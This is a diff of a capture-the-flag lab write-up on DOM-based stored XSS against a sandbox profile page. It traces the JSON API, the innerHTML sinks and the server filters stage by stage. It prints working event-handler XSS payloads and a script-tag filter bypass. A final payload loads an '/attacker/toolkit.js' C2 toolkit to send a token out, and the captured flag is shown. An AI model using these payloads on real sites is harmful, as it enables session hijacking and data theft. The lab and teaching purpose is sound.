@@ -59,87 +59,59 @@ The JSON is safe in transit. The frontend made it dangerous.
 - Start openvpn.
 - Put IP address of the sandbox in `/etc/hosts` file.
 ```bash
-echo "10.42.4.60 web0x0c.hbtn" | sudo tee -a /etc/hosts
+echo "10.42.46.79 web0x0c.hbtn" | sudo tee -a /etc/hosts
 ```
 
 
-**Task 3 is a DOM-based stored XSS — the twist matters.** Unlike Task 2, where the *server* embedded the input into the HTML it sent, here the server's JSON API returns the data **clean and safe in transit**. The vulnerability is entirely **client-side**: the frontend JavaScript takes that JSON and injects a field into the page using **`innerHTML`** (the dangerous sink) instead of `textContent` (safe). So the same string is harmless as JSON but becomes executable the moment the browser parses it as HTML.
+## Step 1: Identify the profile JSON API
 
-This is the distinction the learning objectives want us to be able to explain: **DOM-based XSS lives in the client-side source→sink flow, not the server response.** The source is `data.bio` (from the API); the sink is `element.innerHTML = ...`.
+Action: Inspect the network traffic generated when loading the Stage 1 profile page.
 
-Same three-stage layout:
-- **Stage 1** (`/profile`): bio field rendered unsafely via `innerHTML`.
-- **Stage 2** (`/profile/settings`): `<script>` tags filtered (so again, `<img onerror>`/`<svg onload>`).
-- **Stage 3** (`/profile/edit`): a *different* hidden field is the vulnerable one — flag here, saved to `4-flag.txt`.
+1. Open Firefox on Kali and navigate to:
 
-**Step 1 — Recon: find the API call and the `innerHTML` sink.**
+   `http://web0x0c.hbtn/profile`
+2. Press `F12` and select Network.
+3. Select the XHR filter (or Fetch/XHR).
+4. Reload the page with `Ctrl+R`.
+5. Find the request that returns profile data and open its Response tab.
 
-Before any payload, we map the source→sink flow. Navigate to:
-```
-http://web0x0c.hbtn/profile
-```
-
-With DevTools open:
-1. **Network tab** → reload the page → find the **API request that returns your profile data** (look for an XHR/fetch returning JSON, something like `/api/profile` or `/profile/api/...`). We need its **URL** and its **JSON response body** (what fields it contains — `bio`, `name`, `website`, etc.).
-
-```url
-http://web0x0c.hbtn/profile/api/data
-```
-response body:
 ```json
 {
-	"bio":"",
-	"location":"",
-	"username":"Guest",
-	"website":""
+	 "bio":"",
+	 "location":"",
+	 "username":"Guest",
+	 "website":""
 }
 ```
 
-2. **Inspector** → find where your profile **bio** is displayed on the page, and note the element it lives in (e.g. `<div id="bio">...</div>`).
+The API endpoint that returns the profile data is:
 
-```html
-<div class="mt-4">
-    <!-- VULNERABLE: Profile data rendered with innerHTML via JS -->
-    <h2 id="profile-username" class="text-2xl font-bold">Guest</h2>
-    <div id="profile-bio" class="text-zinc-400 mt-2">No bio set</div>
-    <div class="flex gap-4 mt-3 text-sm text-zinc-500">
-        <span id="profile-location"></span>
-        <span id="profile-website"></span>
-    </div>
-</div>
+```
+http://web0x0c.hbtn/profile/api/data
 ```
 
 
-**Why both:** the Network request tells us the data **source** (and later, where to submit the payload); the rendered element tells us the **sink** location. Knowing the exact API URL now also saves us the endpoint-hunting pain we hit in Task 2 — we'll have the feature's real paths up front.
 
+## Step 3: Locate the DOM rendering code
 
+On `http://web0x0c.hbtn/profile`:
 
-**The source (API):** `/profile/api/data` returns JSON with four fields:
-```json
-{"bio":"","location":"","username":"Guest","website":""}
-```
+1. Open Firefox DevTools (`F12`).
+2. Select Debugger (Firefox's equivalent of Chrome's Sources tab).
+3. Press `Ctrl+Shift+F` to search across loaded source files.
+4. Search for:
+   ```
+   innerHTML
+   ```
+5. Look for code associated with `/profile/api/data`, particularly assignments resembling:
+   ```
+   element.innerHTML = data.bio;
+   ```
 
-**The sinks (DOM):** four elements the frontend populates from that JSON:
-- `#profile-username` ← `username`
-- `#profile-bio` ← `bio`
-- `#profile-location` ← `location`
-- `#profile-website` ← `website`
+The JavaScript containing `innerHTML`, responsible for loading and saving the profile data:
 
-The HTML comment literally confirms it: `<!-- VULNERABLE: Profile data rendered with innerHTML via JS -->`. So the frontend JS reads the JSON and assigns these fields into the DOM — and the task tells us at least one uses `innerHTML` (dangerous) rather than `textContent` (safe).
-
-**The key investigative question for a DOM XSS:** *which* fields go through `innerHTML` vs `textContent`? That's the whole game — and it directly sets up Stage 3's "a different field is vulnerable" twist. The frontend code will show us exactly. Let's read it.
-
-**Step 2 — find the frontend rendering code (the sink assignment).**
-
-We need the JavaScript that fetches `/profile/api/data` and assigns the fields.
-
-In DevTools → **Sources** tab (or View Source `Ctrl+U`), search for how the fields are rendered.
-
-**Why this is the decisive step:** it tells us, per field, whether the sink is `innerHTML` (exploitable) or `textContent` (safe). On Stage 1 the hint says `bio` is the `innerHTML` one. But for Stage 3, a *different* field (location? website? username?) will be the unexpected `innerHTML` sink while bio may be locked down. Reading this code once reveals the vulnerable field for every stage — no guessing.
-
-Paste the rendering block (the lines assigning `data.bio`, `data.username`, `data.location`, `data.website` to their elements). That shows us exactly which sink to target.
-
-```js
+```javascript
+<script>
 // Load profile data from API and render with innerHTML (VULNERABLE)
 async function loadProfile() {
     try {
@@ -156,65 +128,7 @@ async function loadProfile() {
         document.getElementById('profile-bio').textContent = '';
     }
 }
-```
 
-That's the whole vulnerability laid bare — and it answers every stage at once. Look at the rendering code:
-
-```javascript
-document.getElementById('profile-username').innerHTML = data.username || 'Guest';
-document.getElementById('profile-bio').innerHTML      = data.bio || 'No bio set';
-document.getElementById('profile-location').innerHTML = data.location ? '📍 ' + data.location : '';
-document.getElementById('profile-website').innerHTML  = data.website ? '🔗 ' + data.website : '';
-```
-
-**All four fields use `innerHTML`.** Every one of them — `username`, `bio`, `location`, `website` — is an unsafe DOM sink. The `catch` block uses `textContent` (safe), but that only runs on error. So this is textbook DOM-based stored XSS: the server's JSON is clean, but the frontend converts every profile field into executable HTML via `innerHTML`.
-
-This confirms the mechanism the task wants you to explain: **the server did nothing wrong — the JSON transport is safe. The frontend made it dangerous by choosing `innerHTML` over `textContent`.** The source is `data.<field>` (from the API), the sink is `.innerHTML =`, and the data flows source→sink entirely in the browser.
-
-Since all four fields are `innerHTML`, Stage 3's "different field is vulnerable" twist is just: on `/profile/edit` the obvious `bio` field will be filtered, and we'll inject through `location`, `website`, or `username` instead — whichever the edit form exposes. We'll confirm that when we get there.
-
-One important note from the `Deeper Concept` box and the hint *"async rendering makes the delayed token pattern very reliable"*: because `loadProfile()` runs **async** (it awaits the fetch), the profile fields — and the `tracking-id` — may not be in the DOM at the instant the `<img onerror>` fires. So we'll likely need `setTimeout` to delay the token read, exactly as the task hints.
-
-**Step 3 — find the profile edit/save form and confirm the injection point.**
-
-To store a payload, we need to **save** profile data (so the API returns it on reload). Navigate to:
-```
-http://web0x0c.hbtn/profile/edit
-```
-
-(This is Stage 3's URL, but it's also where the edit form lives — let's inventory it now.)
-
-
-```html
-<div class="bg-zinc-900 rounded-2xl border border-zinc-800 p-6">
-        <h2 class="text-lg font-bold mb-4">Update Profile</h2>
-        <div class="space-y-4">
-            <div>
-                <label class="block text-sm text-zinc-400 mb-1">Username</label>
-                <input type="text" id="edit-username" value="Guest" class="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-2.5 focus:outline-none focus:border-nexus-500 transition-colors">
-            </div>
-            <div>
-                <label class="block text-sm text-zinc-400 mb-1">Bio</label>
-                <textarea id="edit-bio" rows="3" placeholder="Tell us about yourself..." class="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-2.5 focus:outline-none focus:border-nexus-500 transition-colors resize-none"></textarea>
-            </div>
-            <div class="grid grid-cols-2 gap-4">
-                <div>
-                    <label class="block text-sm text-zinc-400 mb-1">Location</label>
-                    <input type="text" id="edit-location" value="" class="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-2.5 focus:outline-none focus:border-nexus-500 transition-colors">
-                </div>
-                <div>
-                    <label class="block text-sm text-zinc-400 mb-1">Website</label>
-                    <input type="text" id="edit-website" value="" class="w-full bg-zinc-800 border border-zinc-700 rounded-lg px-4 py-2.5 focus:outline-none focus:border-nexus-500 transition-colors">
-                </div>
-            </div>
-            <button onclick="saveProfile()" class="bg-nexus-600 hover:bg-nexus-700 px-6 py-2.5 rounded-lg font-medium transition-colors">
-                Save Changes
-            </button>
-        </div>
-</div>
-```
-
-```js
 async function saveProfile() {
     const data = {
         username: document.getElementById('edit-username').value,
@@ -233,143 +147,314 @@ async function saveProfile() {
 }
 
 loadProfile();
+</script>
 ```
 
 
-**The complete flow:**
-- **Edit form** has four editable fields: `username`, `bio`, `location`, `website`.
-- **Save** (`saveProfile()`): collects all four → `POST /profile/api/update` (JSON body) → then calls `loadProfile()`.
-- **Load** (`loadProfile()`): `GET /profile/api/data` → assigns **all four fields via `innerHTML`**.
+We now have the complete source-to-sink chain:
 
-So the attack is: save a profile field containing an HTML payload → it persists server-side → on every page load, `loadProfile()` injects it via `innerHTML` → our event handler fires. Pure stored DOM XSS.
+- Source: `GET /profile/api/data`
+- Storage endpoint: `POST /profile/api/update`
+- Vulnerable sink: `document.getElementById('profile-bio').innerHTML = data.bio`
+- Important discovery: All four profile fields use `innerHTML`, making each a potential XSS injection point.
 
-**A key subtlety for our payload (the async timing the task warned about):** `saveProfile()` calls `loadProfile()` which is `async` and awaits a fetch. Our `<img onerror>` will fire the moment `innerHTML` is set — but the `tracking-id` element and other data may not be ready yet. The task hint said this explicitly: *"async rendering makes the delayed token pattern very reliable."* So we'll wrap the token read in `setTimeout` from the start.
+Because the frontend uses `innerHTML`, injected `<script>` elements generally won't execute, but HTML event handlers can.
 
-**Step 4 — store the first payload in the `bio` field (Stage 1 proof).**
+## Step 4: Prove stored XSS execution in Stage 1
 
-Let's start on Stage 1 (`/profile`) by saving a payload in `bio`, then confirm it executes on reload. We'll use a harmless console test first to prove the `innerHTML` sink fires.
+On `http://web0x0c.hbtn/profile`, enter this payload into the Bio field (make sure there is no trailing newline):
 
-On `http://web0x0c.hbtn/profile/edit`:
-
-1. In the **Bio** field, enter: `<img src=x onerror=console.log('PROFILE-XSS-OK')>`  (make sure there is no trailing whitespace or newline).
-2. Leave the other fields as-is (username can stay "Guest").
-3. Click **Save Changes**.
-4. Then navigate to `http://web0x0c.hbtn/profile` (Stage 1) with **Console** open and reload.
-
-Check:
-1. `PROFILE-XSS-OK` prints in the console - ✅
-2. In **Network**, confirm the `GET /profile/api/data` response now contains:
-```json
-{
-    "bio":"<img src=x onerror=console.log('PROFILE-XSS-OK')>",
-    "id":3,
-    "location":"",
-    "session_id":"DrOQc2pzn47aOQ8g20vDvO0ecLNsmDsVgiU9f8JF9d4",
-    "stage":1,
-    "username":"Guest",
-    "website":""
-}
 ```
-3. In **Inspector**, confirm a real `<img>` node appears inside `#profile-bio`.
-```html
-<div id="profile-bio" class="text-zinc-400 mt-2"><img src="x" onerror="console.log('PROFILE-XSS-OK')"></div>
+<img src=x onerror="console.log('PROFILE_XSS_STAGE1_EXECUTED')">
 ```
 
+Click Save Profile, then reload the page with the Firefox Console open.
 
-Two things worth noting:
-- **`"stage":1`** — the API tells us which stage we're on. On `/profile/edit` this will read `stage:3`. This is the server-side scoreboard for this feature (like the `level_4_stage` cookie in Task 2).
-- **`session_id`** matches the one from Task 2 — same session carries across the whole lab.
+Console result:
 
-So Stage 1 is fully proven: payload stored → JSON carries it → `innerHTML` renders it → `<img onerror>` fires automatically. That satisfies the first two checklist items (Network shows payload in API response; Elements shows it inserted via `innerHTML`).
+```
+PROFILE_XSS_STAGE1_EXECUTED
+```
 
-Now — the flag is at **Stage 3** (`/profile/edit` with a hidden vulnerable field), same as before. Rather than burn steps proving the token-exfil on Stage 1, let's go straight to Stage 3's structure, since we already know the exfil mechanism from Task 2 (load toolkit → `pwn(level, stage, callbackPath)` with the **feature-specific** path and **session-correct** stage).
+The image fails to load, triggering `onerror` and executing JavaScript. Since the message appears after reloading, we've confirmed persistent stored XSS rather than a one-time DOM injection.
 
-But first we need two unknowns that are specific to this profile feature:
-1. **The correct `callbackPath`** for the profile feature (not the sort or reviews one).
-2. **Which field** is the Stage 3 injection point (bio may be filtered on `/profile/edit`).
+On dev-tools \ storage \ cookies we can see the session cookie:
 
-**Step 6 — probe the profile track endpoint.**
+```
+session:"eyJmbGFncyI6W10sImxldmVsXzVfc3RhZ2UiOjEsInNlc3Npb25faWQiOiIxcjZPVGRycHYxZm5oaWM2ZzBiS29GV1BvRXBXMXkyT0ctWktla2dqSzFvIn0.auWuQw.zzuJ5AqAo-Lup4NsqEj19D17isk"
+```
+The Anatomy of the Cookie:\
+It consists of three parts separated by periods (.): \
+```
+session = [Payload] . [Timestamp] . [Signature]
+```
 
-In the browser or curl, test:
+Decoding the cookie payload with base64:
+
+```bash
+echo "eyJmbGFncyI6W10sImxldmVsXzVfc3RhZ2UiOjEsInNlc3Npb25faWQiOiIxcjZPVGRycHYxZm5oaWM2ZzBiS29GV1BvRXBXMXkyT0ctWktla2dqSzFvIn0" | base64 -d
+{"flags":[],"level_5_stage":1,"session_id":"1r6OTdrpv1fnhic6g0bKoFWPoEpW1y2OG-ZKekgjK1o"}
+```
+
+This reveals that we're on Level 5 Stage 1.
+
+
+## Step 5: Identify the profile tracking endpoint
+
+From Task 2, we learned that the C2 toolkit's `XSS.pwn()` function requires the correct level, stage, and tracking endpoint.
+
+For Task 3, `/profile/api/track` is a plausible candidate, but we need to verify it.
+
 
 ```bash
 curl http://web0x0c.hbtn/profile/api/track?t=test
 {"status":"error"}
 ```
 
-That's the endpoint — confirmed on the first try this time. `/profile/api/track?t=test` → `{"status":"error"}` (not 404), so the endpoint exists and just needs a valid token. That's our `callbackPath`.
+The response `{"status":"error"}` shows that `/profile/api/track` exists and processes the request, although we haven't established the correct token yet.
+
+## Step 6: Inspect Stage 2, Profile Settings
+
+Objective: Determine whether our existing Stage 1 stored XSS payload also executes on Stage 2.
+
+Action:
+
+1. Navigate to:
+```
+http://web0x0c.hbtn/profile/settings
+```
+2. Open Firefox DevTools → Console.
+3. Clear the Console and reload the page.
+
+Look for our previously stored execution marker:
+
+```
+PROFILE_XSS_STAGE1_EXECUTED
+```
+
+The observations:
+
+- The `PROFILE_XSS_STAGE1_EXECUTED` doesn't appear in the Console.
+- The Bio field is empty, "No bio set" is displayed under Guest.
+
+Stage 2 isn't displaying our Stage 1 payload at all.
+
+This suggests stage-specific profile storage or filtering, but we can't distinguish between them yet. Let's establish whether Stage 2 accepts and renders HTML independently.
+
+## Step 7: Test HTML injection on Stage 2
+
+Stay on:
+
+`http://web0x0c.hbtn/profile/settings`
+
+Enter the following into the Bio field (make sure there is no trailing newline):
+
+```
+<b id="stage2-probe">STAGE2_HTML_OK</b>
+```
+
+Click Save Profile, then reload the page.
+
+Observations:
+
+1. The `STAGE2_HTML_OK` appears in bold, there are no literal HTML tags. \
+`/profile/api/data` returns:
+
+```json
+{
+    "bio":"<b id=\"stage2-probe\">STAGE2_HTML_OK</b>",
+    "id":4,
+    "location":"",
+    "session_id":"1r6OTdrpv1fnhic6g0bKoFWPoEpW1y2OG-ZKekgjK1o",
+    "stage":2,
+    "username":"userSettings",
+    "website":""
+}
+```
+2. The value persist after reloading.
 
 
-So we have everything we need except the Stage 3 injection field. Let's get that now.
 
-**Step 7 — find the Stage 3 vulnerable field.**
+We also learned that the API exposes `"stage":2` and `"id":4`, supporting the hypothesis that profiles are stored separately by stage.
 
-Navigate to the Stage 3 URL:
+## Step 8: Test Stage 2 script filtering and XSS execution
+
+Objective: Determine whether Stage 2 strips `<script>` elements while allowing JavaScript event handlers.
+
+Stay on:
+
+`http://web0x0c.hbtn/profile/settings`
+
+Replace the Bio field with (make sure there is no trailing newline):
+
+```
+<script>console.log('STAGE2_SCRIPT')</script><img src=x onerror="console.log('STAGE2_XSS_EXECUTED')">
+```
+
+Click Save Profile, then reload with DevTools → Console open.
+
+Inspect the `/profile/api/data` response as well.
+
+Observations:
+
+1. The exact value of `bio` in the API JSON response. \
+```json
+{
+    "bio":"<img src=x onerror=\"console.log('STAGE2_XSS_EXECUTED')\">",
+    "id":5,
+    "location":"",
+    "session_id":"1r6OTdrpv1fnhic6g0bKoFWPoEpW1y2OG-ZKekgjK1o",
+    "stage":2,
+    "username":"userSettings","website":""
+}
+```
+2. `STAGE2_XSS_EXECUTED` appears in the Console.
+
+
+We have established that:
+
+- The server removes `<script>` elements from the saved bio.
+- The `<img onerror>` payload survives unchanged.
+- JavaScript executes automatically when the stored profile is rendered.
+- The payload persists after reloading.
+
+This demonstrates why filtering `<script>` tags alone is insufficient to prevent XSS.
+
+## Step 9: Investigate Stage 3, Profile Edit
+
+Objective: Identify the profile fields available in Stage 3 before testing the hidden vulnerable field.
+
+Navigate to:
+
 ```
 http://web0x0c.hbtn/profile/edit
 ```
 
-The hint says *"inspect all profile fields, not just bio"* — on Stage 3, bio is likely filtered but another field (`username`, `location`, or `website`) is still injected via `innerHTML`. We need to find which one survives.
+Open Firefox DevTools → Network, reload the page, and inspect the response from:
 
-Save a probe into **each** field at once so we can see which executes. In the edit form, set:
-- **Username:** `<img src=x onerror=console.log('U')>`
-- **Bio:** `<img src=x onerror=console.log('B')>`
-- **Location:** `<img src=x onerror=console.log('L')>`
-- **Website:** `<img src=x onerror=console.log('W')>`
+`GET /profile/api/data`
 
-(single line each, no trailing newline - the newline broke the script last time)
+The complete JSON response:
 
-Click **Save Changes**, then reload `/profile/edit` (or `/profile`) with **Console** open.
-
-**Results:**
-1. The letters printed on console: `U`, `B`, `L`, `W` printed.
-2. Checking the **`GET /profile/api/data`** response:
 ```json
 {
-	"bio":"<img src=x onerror=console.log('B')>",
-	"id":4,
-	"location":"<img src=x onerror=console.log('L')>",
-	"session_id":"DrOQc2pzn47aOQ8g20vDvO0ecLNsmDsVgiU9f8JF9d4",
-	"stage":1,
-	"username":"<img src=x onerror=console.log('U')>",
-	"website":"<img src=x onerror=console.log('W')>"
+    "bio":"",
+    "location":"",
+    "username":"Guest",
+    "website":""
 }
 ```
 
+The Stage 3 hint suggests that the vulnerability is in a field other than `bio`. Rather than guessing, we'll inspect the returned data and then test the fields systematically.
 
-Interesting:
+Stage 3 currently returns the default profile: `Guest`, with empty `bio`, `location`, and `website` fields.
+
+Unlike Stage 2, the response has no `id` or `stage` metadata. That is consistent with a profile that hasn't yet been saved for this stage, although it doesn't prove that storage is separate.
+
+## Step 10: Test Bio and Username Fields for HTML injection
+
+Objective: Determine whether Stage 3's `username` field accepts and renders HTML.
+
+On `http://web0x0c.hbtn/profile/edit`, replace the Username field with:
+
+```
+<b id="stage3-username-probe">STAGE3_USERNAME_HTML</b>
+```
+
+and the Bio field with:
+
+```<b id="stage3-bio-probe">STAGE3_BIO_HTML</b>
+```
+(make sure there are no trailing newlines).
+
+Click Save Profile and reload the page.
+
+Observations:
+
+1. The `STAGE3_USERNAME_HTML` appears in bold
+2. The `STAGE3_BIO_HTML` displays html encoded HTML tags.
+3. The `GET /profile/api/data` returns:
 
 ```json
-{..., "stage":1, ...}
+{
+    "bio":"&amp;lt;b id=&amp;quot;stage3-username-probe&amp;quot;&amp;gt;STAGE3_BIO_HTML&amp;lt;/b&amp;gt;",
+    "id":7,
+    "location":"",
+    "session_id":"1r6OTdrpv1fnhic6g0bKoFWPoEpW1y2OG-ZKekgjK1o",
+    "stage":3,
+    "username":"<b id=\"stage3-username-probe\">STAGE3_USERNAME_HTML</b>","website":""
+}
 ```
 
-It says **`stage:1`**, even though you're on `/profile/edit`. And all four fields stored the raw payloads (all four `innerHTML` sinks are live — `U`, `B`, `L`, `W` all available). So `/profile/api/data` is returning the **same stored profile regardless of which URL we view it from** — the `stage` field here seems tied to something else, not the URL path.
+We've identified the Stage 3 vulnerability: the Username field is rendered as HTML, while the Bio field is encoded.
 
-This matters because `pwn()` needs the **correct stage number** to validate the flag (remember Task 2: wrong level/stage = no flag).
+| Field      | API behavior                 | Browser behavior       |
+| ---------- | ---------------------------- | ---------------------- |
+| `username` | Raw HTML preserved           | `<b>` renders in bold  |
+| `bio`      | HTML entities double-encoded | Tags displayed as text |
 
+This is exactly the Stage 3 twist described in the challenge. The frontend may use `innerHTML` for both fields, but the server applies different encoding rules.
 
-**Step 8 — fire the Stage 3 flag payload.**
+## Step 11: Confirm stored XSS in the Username field
 
-We'll inject into the **bio** field (any of the four works, but bio is the documented Stage 1→3 field). The payload loads the toolkit and calls `pwn(3, 3, '/profile/api/track')`. Critically — per the task's own hint (*"async rendering makes the delayed token pattern very reliable"*) — we wrap it in `setTimeout` so the `tracking-id` is in the DOM before `pwn()` reads it.
+Objective: Verify that JavaScript executes from the stored `username` value after reloading Stage 3.
 
-On `http://web0x0c.hbtn/profile/edit`, set the **Bio** field to this **single line (no trailing newline)**:
+On `http://web0x0c.hbtn/profile/edit`, replace the Username field with:
 
-```html
-<img src=x onerror=setTimeout(function(){import('/attacker/toolkit.js').then(function(){XSS.pwn(3,3,'/profile/api/track')})},1500)>
+```
+<img src=x onerror="console.log('PROFILE_XSS_STAGE3_EXECUTED')">
 ```
 
-Notes on why this shape:
-- `setTimeout(...,1500)` — waits 1.5s for the async `loadProfile()` fetch + render to finish, so `tracking-id` exists when `pwn()` reads it (the task's "delayed token pattern").
-- `function(){}` (not arrow) — avoids `>` breaking the attribute (the Task 2 lesson).
-- Single quotes are fine **inside `onerror`** here because, unlike the reviews `title="..."` attribute, this `onerror=` value isn't wrapped in conflicting quotes in the DOM sink — but **keep it on one line with no trailing newline** (that was what broke the inline script earlier).
+Click Save Profile, then reload with Firefox DevTools → Console open.
 
-Then:
-1. Click **Save Changes**.
-2. Open **Network** (clear filter so you see toolkit.js, `/attacker/api/*`, and `track`) and **Console**.
-3. Reload `/profile/edit` (or `/profile`).
+Console output: ✅
 
-Tell me:
-1. **Console** — `[XSS Toolkit Loaded]` and `[PWN] Target compromised!`? Any error?
-2. **Network** — did `/attacker/toolkit.js` load (200)? And what does **`GET /profile/api/track?t=...`** return in its **Response** — `{status:"error"}` or `{status:"tracked","ref":"FLAG{...}"}`?
+```
+PROFILE_XSS_STAGE3_EXECUTED
+```
 
-If it returns the flag → that's your `4-flag.txt`. If it says `error`, we'll adjust the stage number (try the `stage:1` value the API reported, i.e. `pwn(1,3,...)`, or decode the session cookie for the authoritative number). Fire it and report the track response.
+Stage 3 stored XSS is confirmed. The Username field executes JavaScript after a page reload.
+
+We now have everything needed for the flag attempt:
+
+- Level: `5`
+- Stage: `3`
+- Vulnerable field: `username`
+- Tracking endpoint: `/profile/api/track`
+- C2 toolkit: `/attacker/toolkit.js`
+
+## Step 12: Attempt Stage 3 flag capture
+
+We'll reuse the `XSS.pwn()` technique that successfully captured the Task 2 flag.
+
+On `http://web0x0c.hbtn/profile/edit`, replace the Username field with:
+
+```
+<img src=x onerror="import('/attacker/toolkit.js').then(()=>XSS.pwn(5,3,'/profile/api/track'))">
+```
+
+Click Save Profile, then reload the page.
+
+Open Firefox DevTools → Network, filter for `track`, and inspect the response from:
+
+`/profile/api/track`
+
+The payload calls `XSS.pwn(5,3,...)`, which should invoke the lab's C2 and flag-capture flow using the correct level, stage, and callback endpoint.
+
+The HTTP response from `/profile/api/track`:
+```json
+{
+    "ref":"FLAG{dde3e144519a50db0432f0422cf8d85e}",
+    "status":"tracked"
+}
+```
+
+**Verify the flag:** ✅
+
+```bash
+echo dde3e144519a50db0432f0422cf8d85e > 4-flag.txt
+git add .
+git commit -m "4-flag.txt"
+git push
+```
+
